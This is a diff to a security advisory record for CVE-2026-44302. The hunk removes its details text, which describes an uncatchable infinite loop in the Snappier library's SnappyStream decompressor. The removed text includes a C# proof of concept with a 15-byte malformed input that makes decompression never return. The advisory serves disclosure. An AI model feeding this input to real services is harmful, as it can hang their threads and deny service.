@@ -7,7 +7,6 @@
     "CVE-2026-44302"
   ],
   "summary": "Snappier has an infinite loop during SnappyStream decompression with malformed framed input",
-  "details": "### Summary\n`Snappier.SnappyStream` enters an uncatchable infinite loop when decompressing a malformed framed-format Snappy stream as small as 15 bytes.\n\n### Details\nThe hang manifests as a userspace busy loop with SnappyStreamDecompressor.Decompress repeatedly calling Crc32CAlgorithm.Append. The exact non-terminating loop in or above Decompress has not been traced further.\n\n### PoC\n```csharp\nusing System.IO.Compression;\nusing Snappier;\n\nbyte[] data = { 0x00, 0x04, 0x00, 0x00, 0x64, 0x4e, 0x6c, 0x71, 0x79, 0x20, 0x77, 0x6f, 0x72, 0x6c, 0x64 };\nusing var src = new MemoryStream(data);\nusing var snap = new SnappyStream(src, CompressionMode.Decompress);\nusing var dst = new MemoryStream();\nsnap.CopyTo(dst);   // never returns\n```\n\n### Impact\nA caller using `SnappyStream` on attacker-controlled bytes can be made to spin forever and burn a thread until the process is killed. `try/catch` around the stream operation can't recover (no exception is thrown).",
   "affected": [
     {
       "package": {
